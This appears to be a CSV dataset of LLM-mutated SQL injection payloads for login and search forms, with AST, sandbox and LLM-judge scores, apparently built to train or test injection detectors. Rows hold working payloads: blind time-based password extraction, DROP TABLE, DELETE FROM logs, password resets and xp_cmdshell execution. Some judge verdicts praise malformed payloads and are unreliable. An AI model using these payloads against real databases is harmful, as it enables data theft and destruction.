query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00154,"1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #","SELECT * FROM users WHERE username = '1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #' AND password = 'anything'",blind_time,login,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""Concat"", ""Select"", ""Identifier"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,The candidate payload is a valid blind time-based SQL injection attack that maintains malicious intent and is realistic for the login context.
q00155,1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --,SELECT * FROM users WHERE username = '1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""Case"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,The candidate payload is a valid blind time-based SQL injection attempt that maintains malicious intent and is realistic for the login context.
q00156,"1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --","SELECT * FROM users WHERE username = '1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,"The candidate payload is a valid blind time attack for the login context, showing a non-trivial mutation from the seed and maintaining malicious intent."
q00157,"1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --","SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""Or"", ""Repeat"", ""EQ"", ""Literal"", ""Concat"", ""Length"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""Chr"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,The candidate payload is a meaningful malicious SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed.
q00158,--' OR '1'='1',SELECT * FROM products WHERE name LIKE '%--' OR '1'='1'%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a valid SQL injection attempt that maintains malicious intent, is realistic for the search context, and represents a non-trivial mutation from the seed payload."
q00161,'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --%',blind_time,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a meaningful malicious SQL injection attempt that fits the search context, shows non-trivial mutation from the seed, and has high quality."
q00162,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,mysql,"[""Case"", ""Or"", ""EQ"", ""If"", ""Anonymous"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,The candidate payload is a valid blind time-based SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.
q00163,"--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--","SELECT * FROM products WHERE name LIKE '%--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a meaningful SQL injection attempt that matches the blind_time attack category, is plausible for the search context, and demonstrates a non-trivial mutation from the seed payload."
q00165,"--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--","SELECT * FROM products WHERE name LIKE '%--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a valid blind time attack variant, demonstrating malicious intent and being plausible in the search context with non-trivial mutation."
q00167,--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables),SELECT * FROM products WHERE name LIKE '%--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables)%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a valid blind time attack for the search context, showing non-trivial mutation from the seed and maintaining malicious intent."
q00169,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,default,"[""Case"", ""Or"", ""If"", ""Identifier"", ""Star"", ""Anonymous"", ""Literal"", ""Parameter"", ""From"", ""Ascii"", ""Substring"", ""Var"", ""Table"", ""GT"", ""Column"", ""EQ"", ""Subquery"", ""Select"", ""Where""]",True,payload_fragment,blind_boolean,True,True,True,4,The candidate payload is a valid blind time-based SQL injection attempt that matches the search context and is a meaningful mutation from the seed payload.
q00202,'; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --,SELECT * FROM users WHERE username = ''; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,postgres,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a valid stacked query attack in the login context, showing meaningful mutation from the seed, and is realistic for the login application."
q00203,"'); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --","SELECT * FROM users WHERE username = ''); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload contains a stacked query with malicious intent, is realistic for the login context, and demonstrates a non-trivial mutation from the seed payload."
q00205,;-- WAITFOR DELAY '0:0:10' --,SELECT * FROM users WHERE username = ';-- WAITFOR DELAY '0:0:10' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a malicious stacked query with non-trivial mutation, realistic for login context, and high quality."
q00206,'; DROP TABLE users --,SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a stacked query attack in the login context, with non-trivial mutation from the seed, and is realistic for the login context."
q00207,'); ALTER USER admin IDENTIFIED BY 'new_password' --,SELECT * FROM users WHERE username = ''); ALTER USER admin IDENTIFIED BY 'new_password' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload contains a stacked query that attempts to inject malicious code into a login form, maintaining its malicious intent and being plausible within the login context."
q00208,'); CREATE DATABASE attacker_db --,SELECT * FROM users WHERE username = ''); CREATE DATABASE attacker_db --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Create"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a stacked query attack in the login context, with non-trivial mutation and realistic for the login scenario."
q00209,'); UPDATE users SET password='hacked' WHERE username='test_user' --,SELECT * FROM users WHERE username = ''); UPDATE users SET password='hacked' WHERE username='test_user' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Update"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload contains a stacked query that targets the login context, demonstrates non-trivial mutation from the seed, and is realistic for the login application context."
q00210,'); DELETE FROM logs --,SELECT * FROM users WHERE username = ''); DELETE FROM logs --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Delete"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a stacked query attack in the login context, with non-trivial mutation and realistic for the login scenario."
q00211,'; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users; --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a meaningful stacked query attack that matches the template context and sandbox detection mode, with non-trivial mutation from the seed payload."
q00212,"' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,The candidate payload is a valid stacked query attack that maintains malicious intent and is realistic for the search context.
q00213,' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --%',stacked_queries,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,The candidate payload is a valid stacked query attack that demonstrates malicious intent and is realistic for the search context.
q00214,"' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/","SELECT * FROM products WHERE name LIKE '%' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,"The candidate payload is a stacked query with a tautology, demonstrating malicious intent and being plausible in the search context."
q00215,'; EXEC('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXEC('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,The candidate payload is a meaningful stacked query attack that matches the search context and is non-trivial in mutation.
q00216,'; INSERT INTO logs (message) VALUES ('Injection detected') --,SELECT * FROM products WHERE name LIKE '%'; INSERT INTO logs (message) VALUES ('Injection detected') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload contains a stacked query with a malicious intent, is plausible for the 'search' context, and demonstrates a non-trivial mutation from the seed payload."
q00217,; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products)),SELECT * FROM products WHERE name LIKE '%; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products))%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,The candidate payload is a stacked query that demonstrates malicious intent and is plausible for the search context. It shows a non-trivial mutation from the seed and is well-formed in the AST.
q00219,'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;,SELECT * FROM products WHERE name LIKE '%'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;%',stacked_queries,search,1,0,0.0,True,postgres,"[""Var"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Parameter"", ""Where"", ""SetItem"", ""From"", ""Set"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a stacked query that maintains malicious intent, is realistic for the search context, shows non-trivial mutation from the seed, and has a high quality score."
q00221,'; EXECUTE('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,The candidate payload is a meaningful stacked query attack that matches the search context and demonstrates non-trivial mutation from the seed.
q00247,' OR '1'='1' --,SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,"The candidate payload is a valid SQL injection attempt that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed payload."
q00248,';-- OR 1=1 --,SELECT * FROM users WHERE username = '';-- OR 1=1 --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,"The candidate payload is a meaningful mutation of the seed payload, preserves malicious intent, and is realistic for the login context."
q00249,/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';,SELECT * FROM users WHERE username = '/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,The candidate payload is a meaningful malicious SQL injection attempt that matches the login context and demonstrates non-trivial mutation from the seed.
q00250,#1 OR (/**/)password = 'admin'--,SELECT * FROM users WHERE username = '#1 OR (/**/)password = 'admin'--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a meaningful malicious SQL injection attempt that fits the login context, shows non-trivial mutation from the seed, and has a high quality score."
q00251,1/* OR */' OR username = username; --,SELECT * FROM users WHERE username = '1/* OR */' OR username = username; --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,"The candidate payload is a meaningful malicious SQL injection attempt that fits the login context, shows non-trivial mutation from the seed, and has a valid AST with successful sandbox execution."
q00253,"-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'","SELECT * FROM users WHERE username = '-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload demonstrates a meaningful mutation of the seed payload, preserving malicious intent while being realistic for the login context."
q00258,"[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""","SELECT * FROM products WHERE name LIKE '%[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""%'",comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,"The candidate payload is a malicious SQL injection attempt with a comment obfuscation technique, and it is realistic for the search context."
q00259,-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;,SELECT * FROM products WHERE name LIKE '%-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,The candidate payload is a meaningful SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.
q00260,/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;,SELECT * FROM products WHERE name LIKE '%/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;%',comment_obfuscation,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,"The candidate payload contains a SQL injection vulnerability in the 'search' context, with a non-trivial mutation from the seed payload, and is realistic for the given context."
q00262,--%'; WAITFOR DELAY '0:0:10' --,SELECT * FROM products WHERE name LIKE '%--%'; WAITFOR DELAY '0:0:10' --%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,4,"The candidate payload is a malicious SQL injection attempt that maintains its intent and is realistic for the search context, with a non-trivial mutation from the seed."
q00263,/*#*/'; INSERT INTO logs VALUES ('attack'); --,SELECT * FROM products WHERE name LIKE '%/*#*/'; INSERT INTO logs VALUES ('attack'); --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload contains a malicious comment_obfuscation attack that is plausible in the search context, with non-trivial mutation and successful sandbox execution."
q00264,'; SELECT name FROM users WHERE id = 1 --,SELECT * FROM products WHERE name LIKE '%'; SELECT name FROM users WHERE id = 1 --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload is a meaningful malicious SQL injection attempt that fits the search context, shows non-trivial mutation from the seed, and has high quality."
q00291,--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--,SELECT * FROM users WHERE username = '--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a meaningful malicious SQL injection attempt with non-trivial mutation, realistic for login context, and high quality."
q00299,"1'/**/UNION/**/ALL/**/SELECT/**/username,password/**/FROM/**/users/**/--","SELECT * FROM users WHERE username = '1'/**/UNION/**/ALL/**/SELECT/**/username,password/**/FROM/**/users/**/--' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,"The candidate payload maintains malicious intent by injecting a UNION SELECT statement in the login context, is realistic for login scenarios, and represents a non-trivial mutation from the seed payload."
q00306,"%\' OR 4747 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101),5)""","SELECT * FROM products WHERE name LIKE '%%\' OR 4747 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101),5)""%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""DPipe"", ""Select"", ""Identifier"", ""Dot"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,The candidate payload is a meaningful SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.
q00312,%25'%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20AND%20%28%29%22,SELECT * FROM products WHERE name LIKE '%%25'%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20AND%20%28%29%22%',encoding_obfuscation,search,1,0,0.0,True,databricks,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""JSONExtract"", ""Mod"", ""JSONPathKey"", ""From"", ""Star"", ""Table"", ""JSONPathRoot"", ""JSONPath"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,The candidate payload is a meaningful malicious SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.
q00313,"%25'%20UNION%20SELECT%20NULL,NULL,NULL(CHAR(0x23))","SELECT * FROM products WHERE name LIKE '%%25'%20UNION%20SELECT%20NULL,NULL,NULL(CHAR(0x23))%'",encoding_obfuscation,search,1,0,0.0,True,mysql,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""Chr"", ""From"", ""Join"", ""Table"", ""Star"", ""HexString"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,The candidate payload is a meaningful malicious SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.
q00334,"(SELECT IF((ASCII(SUBSTRING(password,1,1))=81),1,2) FROM (SELECT password FROM users WHERE username='{input}') AS a--","SELECT * FROM users WHERE username = '(SELECT IF((ASCII(SUBSTRING(password,1,1))=81),1,2) FROM (SELECT password FROM users WHERE username='{input}') AS a--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,mysql,"[""Struct"", ""EQ"", ""Paren"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,"The candidate payload demonstrates a nested SQL injection attack with a valid AST and sandbox execution, showing meaningful mutation from the seed."
q00335,"' OR EXISTS(SELECT * FROM (SELECT username,password FROM users WHERE username='{input}')) AND '%'='%","SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM (SELECT username,password FROM users WHERE username='{input}')) AND '%'='%' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,"The candidate payload is a valid nested SQL injection attack that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed."
q00337,"IF(EXISTS(SELECT 1 FROM (SELECT username,password FROM users WHERE username='{input}') AS b),1,2)--","SELECT * FROM users WHERE username = 'IF(EXISTS(SELECT 1 FROM (SELECT username,password FROM users WHERE username='{input}') AS b),1,2)--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""TableAlias"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""From"", ""Table"", ""Exists"", ""Where"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload demonstrates a nested SQL injection attack with a valid AST and sandbox execution, showing meaningful mutation from the seed."
q00339,"-- (SELECT COUNT(*) FROM users WHERE username LIKE CONCAT('{input}', '%'))","SELECT * FROM users WHERE username = '-- (SELECT COUNT(*) FROM users WHERE username LIKE CONCAT('{input}', '%'))' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,"The candidate payload is a nested SQL injection attack that is plausible in the login context, shows non-trivial mutation from the seed, and maintains malicious intent."
q00341,{username}'; EXECUTE FUNCTION get_user_id('{input}')--,SELECT * FROM users WHERE username = '{username}'; EXECUTE FUNCTION get_user_id('{input}')--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,"The candidate payload demonstrates a nested SQL injection attack with a valid AST and successful sandbox execution, showing a meaningful mutation from the seed."
q00343,"(SELECT 1 FROM (SELECT username FROM users WHERE username='{input}' UNION SELECT username FROM users WHERE username='<script>alert(""XSS"")</script>') AS sub)","SELECT * FROM users WHERE username = '(SELECT 1 FROM (SELECT username FROM users WHERE username='{input}' UNION SELECT username FROM users WHERE username='<script>alert(""XSS"")</script>') AS sub)' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""TableAlias"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""From"", ""Table"", ""Where"", ""Column""]",True,complete_query,blind_boolean,True,True,True,4,The candidate payload is a valid nested SQL injection attack that demonstrates a malicious intent and is realistic for the login context.
